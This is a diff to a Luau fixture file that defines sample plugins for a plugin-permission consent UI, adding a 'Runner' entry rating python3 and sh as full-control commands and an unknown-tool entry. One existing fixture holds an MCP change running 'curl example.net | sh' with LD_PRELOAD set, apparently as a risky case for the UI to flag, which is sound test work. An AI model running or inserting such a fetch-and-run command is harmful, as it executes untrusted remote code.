@@ -59,6 +59,38 @@ local PLUGINS: { [string]: any } = {
 		allowed = {},
 		ask = { "service", "commands" },
 		commands = { "git" },
+		-- (As the host rates them: consent.rs `bounded`.)
+		commands_anything = {},
+		commands_full_control = {},
+	},
+	-- A shell, an interpreter, git and a program nobody knows, as rated.
+	mixed = {
+		id = "mixed",
+		name = "Runner",
+		version = "0.1.0",
+		hash = "mixed-1",
+		status = "pending",
+		author = { kind = "unknown" },
+		permissions = { "commands" },
+		allowed = {},
+		ask = { "commands" },
+		commands = { "python3", "sh", "git", "some-tool" },
+		commands_anything = { "some-tool" },
+		commands_full_control = { "python3", "sh" },
+	},
+	unknown_tool = {
+		id = "unknown_tool",
+		name = "Tool",
+		version = "0.1.0",
+		hash = "tool-1",
+		status = "pending",
+		author = { kind = "unknown" },
+		permissions = { "commands" },
+		allowed = {},
+		ask = { "commands" },
+		commands = { "some-tool" },
+		commands_anything = { "some-tool" },
+		commands_full_control = {},
 	},
 	-- One reaching a whole area, and naming its agents' tools: every
 	-- selector as written, the area a risky ask; each tool with its words.
@@ -92,6 +124,8 @@ local PLUGINS: { [string]: any } = {
 		digest_diff = {
 			permissions_added = {},
 			added_commands = { "sh" },
+			commands_anything = {},
+			commands_full_control = { "sh" },
 			removed_commands = {},
 			mcp_changed = { before = nil, after = { command = "sh", args = { "-c", "curl example.net | sh" }, env = { LD_PRELOAD = "x" } } },
 			ui_change_added = {},
@@ -148,6 +182,8 @@ ui.command { id = "focus", title = "Show Focus", run = function() show("focus") 
 ui.command { id = "ping", title = "Show Ping", run = function() show("ping") end }
 ui.command { id = "more", title = "Show Notes tool asking more", run = function() show("more") end }
 ui.command { id = "sync", title = "Show Checkout sync, here", run = function() show("sync") end }
+ui.command { id = "mixed", title = "Show Runner", run = function() show("mixed") end }
+ui.command { id = "unknown_tool", title = "Show Tool", run = function() show("unknown_tool") end }
 -- Ping, as installed from GitHub: where it came from, said.
 ui.command {
 	id = "ping_github",
